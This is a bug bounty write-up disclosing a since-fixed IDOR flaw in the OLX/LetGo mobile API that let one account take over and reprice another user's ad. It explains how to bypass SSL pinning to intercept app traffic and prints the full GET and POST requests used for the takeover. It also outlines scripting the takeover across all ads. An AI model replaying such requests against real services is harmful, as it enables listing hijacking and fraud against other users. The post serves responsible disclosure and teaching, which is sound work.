---
layout: post
title:  "Taking over every Ad on OLX (automated), an IDOR story"
date:   2017-10-18 15:30:00 +0200
categories: bugbounty idor
---
# Public disclosure #
Hi again! Thank you for reading my third blog post. Happy to share all the details with you on the Insecure Direct Object Reference attack (IDOR) as mentioned in my first blog. It has been resolved by OLX and publicly disclosed on HackerOne, meaning it's time for a write-up!

# Some context #
OLX powers the LetGo website for a couple of countries including The Netherlands. LetGo is an eBay like website, allowing you to buy new stuff and let go of old stuff.

You can probably imagine the excitement I felt finding out I could take over an ad uploaded by someone else and change the pricing and details. The changes will have to go through a manual approval process, but from my repeated experience this ends up fine. Especially for example changing prices from 40 to 35 euros will always go through. Also it appears that after several approvals my account got whitelisted and approvals were not required anymore.

Because there was no rate limiting in place and the API supported walking through the full listing of all the ads, there was a potential for building a small script that does exactly that. Loop all the ads, take over each ad, change the pricing. This way it was possible to take over the entire collection of ads on the website.

Of course it's not a good idea to actually do so, no need to prove anything this severe and cause damage. So right after verifying the initial IDOR and the moment I saw the potential I reported the issue. Also note that I did not take over any ads that were not mine: always use multiple test accounts! Safety first.

# How I found the IDOR #
Having OLX permission: full disclosure time!

First of all we need to proxy the traffic coming from the iOS / Android apps. This traffic is SSL encrypted which is fine: just import the CA BurpSuite provisions for you. But nowadays some apps implement SSL pinning, meaning the BurpSuite CA does not work out of the box. You can bypass this added layer of protection by unpinning SSL. One way would be reverse engineering the app and patching out the checks, but a much easier way is to unpin system wide.

So I have set up both a jailbroken iPad with SSL pinning disabled (using a cydia app) and an Android phone with SSL pinning disabled (using an Xposed module). This way you can always intercept traffic using a proxy like BurpSuite and (almost) any app. Note that you can just as easily set up Android emulators to accomplish the same goal (try genymotion or android studio).

By intercepting the API calls during browsing of your iOS and Android apps, you can learn about-, change- and repeat API calls.

Setup test accounts:
- Android account: token '111111'
- iOS     account: token '222222'

ACCOUNT\_1:
1. Post a new ad using token '111111' (returns the ID, in this test case: 888888).
2. Wait for approval
3. Approved and published on site

ACCOUNT\_2:
1. Fetch advertisement list through a search api call
2. Attack an ad by doing a POST call (picked the newly posted 888888 here).
3. The takeover of the ad is instant: it's now in ACCOUNT\_2, not in ACCOUNT\_1 anymore
4. Wait for approval
5. Approved and published on site with my changes

The attack - using ACCOUNT\_2 - involves two api calls: GET /i2/ajax/ads/ (to get id's) and POST /i2/newadding/ (to take over and make changes).

The GET call lists all the ads including id's (paginated) and looks like this:

{% highlight html %}
GET /i2/ajax/ads/?json=1&app\_ios=285&brand=Letgo&client=ios&version=285&token=222222&location=1,1&lang=en&search%5Blat%5D=1&search%5Blon%5D=1&search%5Border%5D=dist&search%5Bdistance%5D=20000 HTTP/1.1
Host: letgonl-a.akamaihd.net
Connection: close
Accept: */*
User-Agent: Mozilla/5.0 (Linux; U; Android 2.2; en-us; Droid Build/FRG22D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1           Accept-Language: en-NL;q=1.0, nl-NL;q=0.9
X-Origin-OLX: production
{% endhighlight %}

The POST call - the actual attack / IDOR - looks like this:

{% highlight html %}
POST /i2/newadding/?json=1&app_ios=285&brand=Letgo&client=ios&version=285&token=222222&location=1,1&lang=en HTTP/1.1
Host: letgonl-a.akamaihd.net
Content-Type: application/json
Content-Length: 222
Accept: */*
Connection: close
User-Agent: Mozilla/5.0 (Linux; U; Android 2.2; en-us; Droid Build/FRG22D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1
Accept-Language: en-NL;q=1.0, nl-NL;q=0.9
X-Origin-OLX: production

{"ad_id":888888,"params":{"price":"35"},"description":"This is awesome","person":"nickname","title":"My title","category_id":"800","locations":[{"map_lon":1,"map_lat":2}]}
{% endhighlight %}

Note that I'm just repeating the GET and POST calls I intercepted, replacing the token from ACCOUNT\_1 with the token from ACCOUNT\_2.

Again I would like to emphasize you must always use test accounts, never cause damage, think before you act. It's a lot of fun, but it's not a game!

My suggested fix was: 'The update POST call does check for something like "is\_authenticated()" but it appears it does not check for "is\_authorized()", which in turn could implement something like "is\_owner()".'

# Lessons learned #
1. Focus on bug bounty programs with a good track record. Chasing should not be nescessary, it's a two way street. And #NoFreeBugs.
2. Know when to stop attacking one specific issue or platform. Got stuck? Keep on moving! Write down your notes on what you have found so far and come back later.

Let's keep on hacking!

Cheers,
kciredor

{% twitter https://twitter.com/kciredor_/status/920647329652371456 %}
